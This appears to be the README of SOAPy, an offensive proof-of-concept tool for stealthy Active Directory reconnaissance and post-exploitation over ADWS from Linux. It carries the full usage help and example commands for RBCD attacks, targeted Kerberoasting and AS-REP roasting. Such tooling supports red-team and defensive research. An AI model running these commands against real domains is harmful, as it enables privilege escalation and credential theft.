# Description
SOAPy is a Proof of Concept (PoC) tool for conducting offensive  interaction with Active Directory Web Services (ADWS) from Linux hosts. SOAPy includes previously undeveloped custom python implementations of a collection of Microsoft protocols required for interaction with the ADWS service. This includes but is not limited to: NNS (.NET NegotiateStream Protocol), NMF (.NET Message Framing Protocol), and NBFSE (.NET Binary Format: SOAP Extension).

SOAPy can be primarily utilized to interact with ADWS for stealthy recon over a proxy into an internal Active Directory environment. Additionally SoaPy can perform targeted DACL-focused post-exploitation over ADWS, including `servicePrincipalName` writing for targeted Kerberoasting, `DON’T_REQ_PREAUTH` writing for targeted ASREP-Roasting, and the ability to write to `msDs-AllowedToActOnBehalfOfOtherIdentity` for Resource-Based Constrained Delegation attacks. 

The protocol structure for interacting with ADWS is shown below:
![image](https://github.com/user-attachments/assets/e83a3e60-7aaf-4084-bcab-41e400d4055e)

The blog detailing the original research largely from an engineering perspective can be found [here](https://www.ibm.com/think/x-force/stealthy-enumeration-of-active-directory-environments-through-adws)

# Usage
```
███████╗ ██████╗  █████╗ ██████╗ ██╗   ██╗
██╔════╝██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
███████╗██║   ██║███████║██████╔╝ ╚████╔╝ 
╚════██║██║   ██║██╔══██║██╔═══╝   ╚██╔╝  
███████║╚██████╔╝██║  ██║██║        ██║   
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝        ╚═╝   

@_logangoins
github.com/jlevere  
          
usage: soapy [-h] [--debug] [--ts] [-H nthash] [--users] [--computers]
             [--groups] [--constrained] [--unconstrained] [--spns]
             [--asreproastable] [--admins] [--rbcds] [-q query]
             [-f attr,attr,...] [-dn distinguishedname] [-p] [--rbcd source]
             [--spn value] [--asrep] [--account account] [--remove]
             [--addcomputer [MACHINE]] [--computer-pass pass] [--ou ou]
             [--delete-computer MACHINE] [--disable-account MACHINE]
             [--dns-add FQDN] [--dns-modify FQDN] [--dns-remove FQDN]
             [--dns-tombstone FQDN] [--dns-resurrect FQDN] [--dns-ip IP]
             [--ldapdelete] [--allow-multiple] [--ttl TTL] [--tcp]
             connection

Perform AD reconnaissance and post-exploitation through ADWS from Linux

positional arguments:
  connection            domain/username[:password]@<targetName or address>

options:
  -h, --help            show this help message and exit
  --debug               Turn DEBUG output ON
  --ts                  Adds timestamp to every logging output.
  -H nthash, --hash nthash
                        Use an NT hash for authentication

Enumeration:
  --users               Enumerate user objects
  --computers           Enumerate computer objects
  --groups              Enumerate group objects
  --constrained         Enumerate objects with msds-allowedtodelegateto
  --unconstrained       Enumerate objects with TRUSTED_FOR_DELEGATION
  --spns                Enumerate accounts with servicePrincipalName set
  --asreproastable      Enumerate accounts with DONT_REQ_PREAUTH set
  --admins              Enumerate high privilege accounts
  --rbcds               Enumerate accounts with msDs-
                        AllowedToActOnBehalfOfOtherIdentity set
  -q query, --query query
                        Raw query to execute on the target
  -f attr,attr,..., --filter attr,attr,...
                        Attributes to select, comma separated
  -dn distinguishedname, --distinguishedname distinguishedname
                        The root object's distinguishedName for the query
  -p, --parse           Parse attributes to human readable format

Writing:
  --rbcd source         Write/remove RBCD (source computer)
  --spn value           Write servicePrincipalName value (use --remove to
                        delete)
  --asrep               Write DONT_REQ_PREAUTH flag (asrep roastable)
  --account account     Account to perform operations on
  --remove              Remove attribute value based on operation
  --addcomputer [MACHINE]
                        Create a computer account in AD (optional MACHINE
                        name)
  --computer-pass pass  Password for the new computer account (optional).
  --ou ou               DN of the OU where to create the computer (optional).
  --delete-computer MACHINE
                        Delete an existing computer account
  --disable-account MACHINE
                        Disable a computer account (set AccountDisabled)
  --dns-add FQDN        Add A record (FQDN). Requires --dns-ip
  --dns-modify FQDN     Modify/replace A record (FQDN). Requires --dns-ip
  --dns-remove FQDN     Remove A record (FQDN). Requires --dns-ip unless
                        --ldapdelete
  --dns-tombstone FQDN  Tombstone a dnsNode (replace with TS record + set
                        dNSTombstoned=true)
  --dns-resurrect FQDN  Resurrect a tombstoned dnsNode
  --dns-ip IP           IP used with dns add/modify/remove
  --ldapdelete          Use delete on dnsNode object (when used with --dns-
                        remove)
  --allow-multiple      Allow multiple A records when adding
  --ttl TTL             TTL for new A record (default 180)
  --tcp                 Use DNS over TCP when fetching SOA serial

```

# Installation
With `pipx`:
```
pipx install .
```


With `poetry`:
```
poetry install
```

# Example Usage

Enumerate users using preset enumeration flags:
```
soapy <domain>/<user>:'<password>'@<ip> --users
```

Enumerate computers `samAccountName` and `objectSid` using a custom query/attribute filtering:
```
soapy <domain>/<user>:'<password>'@<ip> --query '(objectClass=computer)' --filter "samaccountname,objectsid"
```

Write `msDs-AllowedToActOnBehalfOfOtherIdentity` on DC01, enabling delegation from MS01 for an RBCD attack:
```
soapy <domain>/<user>:'<password>'@<ip> --rbcd 'MS01$' --account 'DC01$'
```

Write the `servicePrincipalName` attribute on jdoe as part of a targeted Kerberoasting attack:
```
soapy <domain>/<user>:'<password>'@<ip> --spn test/spn --account jdoe
```

Write `DONT_REQ_PREAUTH` (0x400000) on jdoe's `userAccountControl` attribute, making the account ASREP-Roastable:
```
soapy <domain>/<user>:'<password>'@<ip> --asrep --account jdoe
```
